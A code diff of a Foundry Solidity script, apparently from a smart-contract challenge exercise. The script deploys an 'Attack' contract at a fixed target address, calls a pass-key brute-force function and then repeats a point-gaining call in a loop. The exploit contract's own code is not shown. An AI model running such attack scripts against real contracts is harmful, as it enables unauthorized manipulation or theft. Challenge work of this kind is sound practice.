@@ -8,11 +8,13 @@ contract AttackScript is Script {
     function setUp() public {}
 
     function run() public {
-        uint private_key = vm.envUint("DEV_PRIVATE_KEY");
-        address account = vm.addr(private_key);
-        console.log("Account", account);
+        // uint private_key = vm.envUint("DEV_PRIVATE_KEY");
+        // address account = vm.addr(private_key);
+        // console.log("Account", account);
 
-        vm.startBroadcast(private_key);
+        // vm.startBroadcast(private_key);
+        // THE ABOVE WAS MUTED BECAUSE THE PRIVATEKEY HAS BEEN ADDED TO THE TERMINAL COMMAND
+        vm.startBroadcast();
 
         // Deploy Attack contract
         Attack attack = new Attack(address(0xeDBc81a4d20B616AFc6Acf43D2197f192049ca04));
@@ -22,10 +24,9 @@ contract AttackScript is Script {
         attack.bruteForcePassKey();
 
         // Call getEnoughPoint four times
-        attack.getEnoughPoint("pope_h");
-        attack.getEnoughPoint("pope_h");
-        attack.getEnoughPoint("pope_h");
-        attack.getEnoughPoint("pope_h");
+        for (uint i = 0; i < 4; i++) {
+            attack.getEnoughPoint("pope_h");
+        }
 
         // Call addYourName
         attack.addYourName();
